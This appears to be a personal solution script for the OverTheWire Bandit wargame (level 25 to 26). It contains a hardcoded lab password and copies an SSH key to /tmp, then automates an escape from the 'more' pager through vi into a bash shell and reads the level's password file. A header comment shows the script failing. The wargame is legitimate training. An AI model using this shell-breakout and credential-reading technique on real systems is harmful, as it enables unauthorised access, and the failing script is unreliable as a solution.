#!/bin/bash

# ERROR :
# Connection to bandit.labs.overthewire.org closed.
# expect: spawn id exp4 not open
#     while executing
# "expect {
#         -re {[0-9A-Za-z]+} {
#             puts "\n[+] Password for bandit26: \$expect_out(0,string)\n"
#         }
#     }"


host="bandit.labs.overthewire.org"
port=2220
user="bandit25"
password="iCi86ttT4KSNe1armKiwbQNmB3YJP3q4"

# Save bandit26 ssh key into /tmp
sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host "cat ~/bandit26.sshkey" > /tmp/bandit26.sshkey
chmod 600 /tmp/bandit26.sshkey

# Now use expect to automate the breakout from 'more'
expect <<'EOF'
    set timeout 10
    spawn ssh -i /tmp/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
    expect {
        -re "--More--.*" {
            # send escape sequence to drop into vi from more
            send "v"
            exp_continue
        }
        "vi" {
            # inside vi, set shell to bash
            send ":set shell=/bin/bash\r"
            send ":shell\r"
        }
    }
    expect {
        -re "bandit26@.*\\$" {
            send "cat /etc/bandit_pass/bandit26\r"
        }
    }
    expect {
        -re {[0-9A-Za-z]+} {
            puts "\n[+] Password for bandit26: \$expect_out(0,string)\n"
        }
    }
    interact
EOF

# https://chatgpt.com/share/68b5a2e8-98e0-8006-bcd8-3b131b0d1075  continue from here